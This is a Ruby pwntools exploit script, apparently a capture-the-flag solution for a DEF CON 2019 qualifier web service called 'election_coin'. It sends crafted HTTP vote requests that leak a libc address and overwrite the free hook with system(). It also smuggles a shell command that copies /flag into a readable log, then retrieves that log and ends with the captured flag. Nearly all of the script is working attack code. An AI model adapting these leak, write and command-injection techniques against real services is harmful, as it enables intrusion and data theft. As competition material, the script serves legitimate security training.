#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

@host, @port = 'election_coin.quals2019.oooverflow.io', 8888
@local = false
if ARGV.empty?
  @host = '127.0.0.1'; @local = true
else
end
$z = Sock.new @host, @port
def z;$z;end
@p = ''
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def ss(data)
  payload = <<-EOS.gsub("\n", "\r\n") + data
POST /api/v1/election/dc2019/vote HTTP/1.1
Host: election_coin.quals2019.oooverflow.io:8888
Content-Length: #{data.size}
Content-Type: application/x-www-form-urlencoded
Connection: Keep-Alive

  EOS
  z.write payload
end

def leak(addr)
  data = <<-EOS
{
    "voter": "bc1#{addr.hex[2..-1].rjust(16, '0')}",
    "votes": {
        "best_ctf_team": {
            "candidate":"0daysober",
            "currency": "bitcoin",
            "amount": 10
        }
    }
}
  EOS
  ss(data)
  z.gets "bitcoin ("
  z.gets(')').to_i(16)
end

def write(at, val)
  data = <<-EOS
{
    "voter": "DD#{format('%016x %016x', at, val)};cp /flag /tmp/bitcoin_tx.log;",
    "votes": {
        "best_ctf_team": {
            "candidate":"0daysober",
            "currency": "dogecoin",
            "amount": 10
        }
    }
}
  EOS
  ss(data)
end

def get_log
  # new connection
  $z = Sock.new @host, @port
  payload = <<-EOS.gsub("\n", "\r\n")
GET /api/v1/exchange/bitcoin/tx_log HTTP/1.1

  EOS
  z.write payload
end

stdout = leak(0x5cc460)
log.dump stdout.hex
free_hook = 0x1e48 + stdout
sys_plt = 0x408850
write(free_hook, sys_plt)

get_log

z.interact

# OOO{S0]\/[3 v0t35 k()57 m0r3 TH4gn 0th3RZ}
